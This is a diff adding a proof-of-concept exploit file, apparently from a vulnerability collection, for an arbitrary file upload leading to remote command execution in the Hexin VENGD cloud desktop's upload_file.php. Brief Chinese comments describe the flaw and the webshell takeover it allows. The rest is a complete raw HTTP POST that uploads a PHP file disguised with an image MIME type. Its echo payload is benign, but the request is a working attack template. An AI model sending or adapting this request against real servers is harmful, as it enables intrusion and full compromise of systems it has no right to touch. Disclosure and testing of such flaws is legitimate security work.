@@ -1,0 +1,18 @@
+# 和信创天云桌面系统_upload_file.php_远程命令执行漏洞
+# 和信下一代云桌面系统（VENGD）是基于NGD(Next Generation Desktop)架构的桌面虚拟化产品。
+# 
+# 和信下一代云桌面存在文件上传漏洞，攻击者可利用漏洞上传webshell，获得服务器权限。
+POST /Upload/upload_file.php?l=test&acid=80000893&bid=hd_tag_m8mv24d8 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24d8
+RM-PRO-Token: 193c8e3452c817c7b4737f7ae4f87b4a
+RM-PRO-Time: 1742808375810
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
+
+------WebKitFormBoundaryfcKRltGv
+Content-Disposition: form-data; name="file"; filename="test.php"
+Content-Type: image/avif
+
+<?php echo("Hello World!"); ?>
+------WebKitFormBoundaryfcKRltGv--
